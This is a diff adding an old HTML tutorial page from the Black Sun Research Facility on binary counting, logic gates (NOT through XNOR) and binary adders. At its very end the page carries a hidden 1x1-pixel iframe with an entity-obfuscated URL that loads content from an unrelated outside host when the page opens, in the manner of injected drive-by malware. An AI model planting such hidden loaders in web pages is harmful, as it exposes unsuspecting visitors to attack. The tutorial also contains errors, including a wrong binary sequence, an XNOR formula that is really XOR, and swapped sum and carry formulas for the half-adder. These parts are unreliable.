@@ -1,0 +1,544 @@
+
+<HTML><HEAD><TITLE>Black Sun Research Facility Tutorials - Boolean Logic Gates</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	COLOR: #ffffff; TEXT-DECORATION: none
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+.small {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+.small_uppercase {
+	FONT-SIZE: 9pt; COLOR: #999999; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+TD {
+	FONT-SIZE: 9pt; COLOR: #aeaeae; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+.7_ver_b_white {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+
+.white {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif
+}
+</STYLE>
+
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY text=#a7a7a7 vLink=#ff9900 aLink=#ffcc00 link=#ff9900 bgColor=#000000 
+leftMargin=0 topMargin=0 marginheight="0" marginwidth="0">
+<BR><BR><PRE><FONT color=red>
+              _________________
+             /_               /\  
+              \/  _______    /  \
+              /  /      /   /   /
+             /  /______/   /   /
+            /           __/   /
+           /  _______   \  __/
+          /  /      /   /  \
+         /  /______/   /   / 
+       _/             /   /      
+      /______________/   /       BLACK SUN RESEARCH FACILITY
+      \              \  /      	   <A href="http://blacksun.box.sk/">http://blacksun.box.sk/</A>
+       \______________\/
+
+
+</FONT>
+
+
+BOOLEAN LOGIC GATES
+=================================================
+
+
+
+   WRITTEN BY                 [ <A href="mailto:cos125@hotmail.com">cos125@hotmail.com</A>                :E-MAIL    ]      
+           <A href="mailto:cos125@hotmail.com">BINARY RAPE</A>        [ 114603188                         :ICQ#      ]      
+                              [ <A href="http://blacksun.box.sk/">http://blacksun.box.sk/</A>           :TURORIALS ]      
+
+
+
+
+
+CONTENTS
+=======================================
+
+1.  Introduction.
+2.  A Quick Look At Binary.
+
+    2.1 A Little Conversion
+
+3.  The Logic Gates.
+   
+    3.1 The Not Gate
+    3.2 The And Gate
+    3.3 The Or Gate
+
+4.  Negated Gates.
+
+    4.1 The Nand Gate
+    4.2 The Nor Gate
+
+5.  The Exclusive Gates.
+   
+    5.1 The Xor Gate
+    5.2 The Xnor Gate
+
+6.  Binary Addition.
+7.  Last Words.
+
+
+
+
+____________________________________________________________________________________________
+
+
+1.0 INTRODUCTION
+=======================================
+
+Before reading this tutorial i suggest you read the bsrf tutorial on
+different number base's and the first few sections of the bsrf assembly
+tutorial unless you are confident that you understand binary and and
+a bit of boolean algebra would help, never the less continue on and
+I hope that things become clear to you.
+
+2.0 A QUICK LOOK AT BINARY
+=======================================
+
+Basically binary is very simple, we as people are used to counting in
+decimal, 1,2,3, etc..., this is known as base 10 as their are 10 numbers
+in decimal 0,1,2,3,4,5,6,7,8,9 and no 10 is not one of them, to get ten
+we put 1 and 0 together when we move past 9, we do this in order to count
+higher, obviously, and once we get passed 9 we go back to 0 move over one
+space and put on a 1.
+
+  0
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9  <- Reached the maximum of our numbers in decimal
+ 10  <- So we move over one place and put on a 1 and start again
+ 11
+ 12
+ 13
+ 14
+ 15
+ 16
+ 17
+ 18
+ 19  <- Again we reach the maximum so we move over one place and add a 1
+ 20
+ 21
+ ..
+ ..
+ 90  <- And so on till we reach 90
+ 91
+ 92
+ 93
+ 94
+ 95
+ 96
+ 97
+ 98
+ 99  <- Weve now reached the maximum on both numbers so we have to move 2 places over and add a 1
+100  <- And the cycle starts again
+
+
+What we have to remember is that decimal has 10 numbers and is therefore
+known as base10, binary only has 2 numbers, 1 and 0 and is therefore known
+as base 2, but what happens when we try and lay out the binary numbers like
+we did above with the decimal ones?
+
+  0
+  1  <- Already weve reached the maximum of binary numbers!
+ 10  <- Like decimal we move over and start again
+ 11  <- So quickly weve already run out on both sides
+111  <- like the decimal number 1 hundred we move over 2 and start again
+
+As you can see there isnt much to binary, lets count to ten in binary
+to get a little more used to it.
+
+Decimal		Binary
+-------		------
+   0		  00
+   1		  01
+   2		  10
+   3		  11
+   4		 100
+   5	 	 101
+   6		 110
+   7		 111
+   8		1000
+   9		1001
+  10		1010
+
+See binary is easy enough and if you leave out the first column
+you will notice that 4 - 7 look like 0 - 3 and remember its just
+like going from 9 to 10 in decimal, move over 1 place and add on
+a 1.
+
+2.1 A LITTLE CONVERSION
+=======================================
+
+So how do we convert from decimal to binary numbers? Sure you could
+write out a table like above and check it to get the binary value
+you want but what if your looking for a value for a number like
+1275, good look writing a table up to 10011111011 or we could just
+use the good old repeated division of 2 method. This works by
+repeatedly dividing the decimal number by 2 and if its an even number
+record a 0, if its an odd record a 1. Say for example we wanted to
+convert 57 to binary:
+
+2/57  remainder = 1
+= 28
+
+2/28  remainder = 0
+= 14
+
+2/14  remainder = 0
+=  7
+
+ 2/7  remainder = 1
+=  3
+
+ 2/3  remainder = 1
+=  1
+
+ 2/1  remainder = 1
+=  0
+
+Now if we put those remainders alongside eachother starting from the
+bottom up we get 111001, which is 57 in binary.
+
+3.0 THE LOGIC GATES
+=======================================
+
+Well binary is nice n easy n all but if thats all that a computer
+understands then how does it go from that to a word processor or an
+entire operating system. Well we build up these complicated tasks
+using simple logic gates and boolean algebra, boolean algebra was
+created by George Boole in Ireland in the 1800's, wahey. The gates
+provide a way to make decisions and more complex tasks are built
+upon them. These gates accept input of Binary numbers and their output
+is based on the type of gate and what input was involved. There are
+three simple gates.
+
+3.1 THE NOT GATE
+=======================================
+
+The simplest of all the gates is the NOT gate, it just takes a binary
+value of either 1 or 0 and gives back the oppossite. The NOT gate is
+symbolised by the operator '~'. Consider the following.
+
+	  A   |   Q
+	------+-------
+	  0   |   1
+	  1   |   0
+
+
+	   ~0 = 1
+	   ~1 = 0
+
+This table shows all possible inputs and outputs of the NOT gate, this
+kind of a table is known as a 'truth table'.
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/not.gif">
+
+   Fig 1.0 Standard NOT Gate
+
+3.2 THE AND GATE
+=======================================
+
+The AND gate unlike the NOT gate doesnt take just one input (A) it takes
+at least 2 (A,B), its symbol is '&'.
+
+	 A  B  |  Q
+	-------+------
+	 0  0  |  0
+	 0  1  |  0
+	 1  0  |  0
+	 1  1  |  1
+
+
+	  0 & 0 = 0
+	  0 & 1 = 0
+	  1 & 0 = 0
+	  1 & 1 = 1
+
+As you can see from the truth table above, the output of a AND gate
+is only equal to 1 when both A AND B are equal to 1, this is the
+following.
+
+If A = 0 and B = 0 then Q = 0
+If A = 0 and B = 1 then Q = 0
+If A = 1 and B = 0 then Q = 0
+If A = 1 and B = 1 then Q = 1
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/and.gif">
+
+   Fig 1.1 Standard AND Gate
+
+3.3 THE OR GATE
+=======================================
+
+The OR gate also only takes in 2 parameters, A and B, its symbol is '|'
+
+	 A  B  |  Q
+	-------+------
+	 0  0  |  0
+	 0  1  |  1
+	 1  0  |  1
+	 1  1  |  1
+
+	
+	  0 | 0 = 0
+	  0 | 1 = 1
+	  1 | 0 = 1
+	  1 | 1 = 1
+
+The OR gate outputs a value of 1 if either A OR B OR both are equal
+to 1
+
+If A = 0 and B = 0 then Q = 0
+If A = 0 and B = 1 then Q = 1
+If A = 1 and B = 0 then Q = 1
+If A = 1 and B = 1 then Q = 1
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/or.gif">
+
+   Fig 1.2 Standard OR Gate
+
+4.0 NEGATED GATES
+=======================================
+
+There are 2 Negated Gates, these are the NOR and NAND gates. Basically
+these gates act like an OR and AND gate only there output is the opposite.
+
+
+4.1 THE NAND GATE
+=======================================
+
+The truth table of a NAND gate is as follows
+
+ 	 A  B  |  Q
+	-------+------
+	 0  0  |  1
+	 0  1  |  1
+	 1  0  |  1
+	 1  1  |  0
+
+Notice that it is the opposite of an AND gate.
+
+	0 & 0 = 0, ~0 = 1
+
+To wrap this up a bit better we use brackets ()
+
+	~(0 & 0) = 1
+	~(0 & 1) = 1
+	~(1 & 0) = 1
+	~(1 & 1) = 0
+
+Now the result of the calcuation in the brackets is negated.
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/nand.gif">
+
+   Fig 1.3 Standard NAND Gate
+
+
+4.2 THE NOR GATE
+=======================================
+
+The truth table for the NOR gate is as follows
+
+ 	 A  B  |  Q
+	-------+------
+	 0  0  |  1
+	 0  1  |  0
+	 1  0  |  0
+	 1  1  |  0
+
+	~(0 | 0) = 1
+	~(0 | 1) = 0
+	~(1 | 0) = 0
+	~(1 | 1) = 0
+
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/nor.gif">
+
+   Fig 1.4 Standard NOR Gate
+
+
+5.0 THE EXCLUSIVE GATES
+=======================================
+
+The final 2 gates remaining are the XOR (eXclusive OR) and
+XNOR (eXclusive NOR) gates. Here they are.
+
+
+5.1 THE XOR GATE
+=======================================
+
+The logic behind this gate is that if either A or B is equal
+to 1 but not both then the output is equal to 1, here is its
+truth table.
+
+ 	 A  B  |  Q
+	-------+------
+	 0  0  |  0
+	 0  1  |  1
+	 1  0  |  1
+	 1  1  |  0
+
+The gate is constructed as follows.
+
+	(A & ~B) | (~A & B)
+
+	(0 & ~0) | (~0 & 0)  = 0
+	(0 & ~1) | (~0 & 1)  = 1
+	(1 & ~0) | (~1 & 0)  = 1
+	(1 & ~1) | (~1 & 1)  = 0
+
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/xor.gif">
+
+   Fig 1.5 Standard XOR Gate
+
+5.2 THE XNOR GATE
+=======================================
+
+The XNOR gate is simply the opposite of the XOR gate, its truth
+table looks like the following.
+
+ 	 A  B  |  Q
+	-------+------
+	 0  0  |  1
+	 0  1  |  0
+	 1  0  |  0
+	 1  1  |  1
+
+
+Its kind of like ~((A & ~B) | (~A & B)).
+
+This is a good time to point out something about boolean algebra,
+remember that ~ changes the value of an input to its opposite,
+therefore ~(~A) = A and the 2 ~'s simply cancel eachother out.
+
+So XNOR becomes (~A & B) | (A & ~B).
+
+&nbsp;&nbsp;&nbsp;<img src="/pictures/xnor.gif">
+
+   Fig 1.6 Standard XNOR Gate
+
+
+6.0 BINARY ADDITION
+=======================================
+
+So we all know how to add decimal numbers (im presuming), its easy
+	
+	1	1	1
+       + 1      + 2      + 3
+       ---      ---      ---
+       = 2      = 3      = 4
+
+But how do we add in binary? Easy watch this
+
+	0	0	1	 1
+       + 0      + 1       + 0       + 1
+       ---      ---       ---       ---
+       = 0      = 1       = 1      = 10
+
+Thats fine but with 1+1 we get a carry over that we have to deal with.
+So we add an extra space to handle the carry.
+
+	0	0	1	1
+       + 0      + 1      + 0       + 1
+       ---      ---      ---       ---
+      = 00     = 01     = 01      = 10
+
+Lets write a truth table to handle this data.
+
+ 	 A  B  |  CO Q
+	-------+--------
+	 0  0  |  0  0
+	 0  1  |  0  1
+	 1  0  |  0  1
+	 1  1  |  1  0
+
+Notice the new column on the truth table for the carry out (CO).
+We now notice that CO and Q and familiar, C0 is the same as an AND
+gate and Q is the same as an XOR.
+
+	A & B = Q
+	
+	(A & ~B) | (~A & B) = CO
+
+Thats fine for adding single bit numbers but what if we want to add
+2 8-bit numbers? In this case were going to need a component called a
+full binary adder. Once we create the full adder we can put 8 of them
+together to form an 8-bit or byte-wide adder and move the carry bit from
+one adder to the next.
+
+The main difference for us between the first adder and this full adder
+is that we now need a third input called a Carry-In (CI).
+
+Heres the truth table for the full adder.
+
+
+       A   B  CI  |  CO Q
+     -------------+--------
+       0   0   0  |  0  0
+       0   0   1  |  0  1
+       0   1   0  |  0  1
+       0   1   1  |  1  0
+       1   0   0  |  0  1
+       1   0   1  |  1  0
+       1   1   0  |  1  0
+       1   1   1  |  1  1
+
+If we examine the output youll realise that the top 4 numbers for C0
+look like an AND gate for A and B and the bottom 4 look like an OR
+gate for A and B, while top 4 of Q look like an XOR and the bottom 4
+like an XNOR gate.
+
+By putting those gates together we could form a form a more complicated
+and useful circuit such as the adder and thats how a computer builds
+up from a series of 1's and 0's to addition.
+
+
+7.0 LAST WORDS
+=======================================
+
+Well in this tutorial we looked at Logic Gates and how they perform
+functions on binary numbers, Gates can be used to build up much better
+and sophisticated functions such as loops and comparisons, used together
+these can easily perform multiplication and division and we can use
+these in everyday equipment, from washing machines and microwave ovens
+to motion sensitive cameras and pc's.
+
+SHOUTS
+=======================================
+
+Starman_Jones		- Thanks for everything over the years (especially for my own room).
+
+Vsus			- I am never drinking Tsambuca with you again :P.
+
+Delusive			- Nice arse luv :P.
+
+BSRF			- Thanks to every-1 at BSRF for releasing this and for being a good laugh :).
+
+ALL @ IRC.BOX.SK
+
+</PRE>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
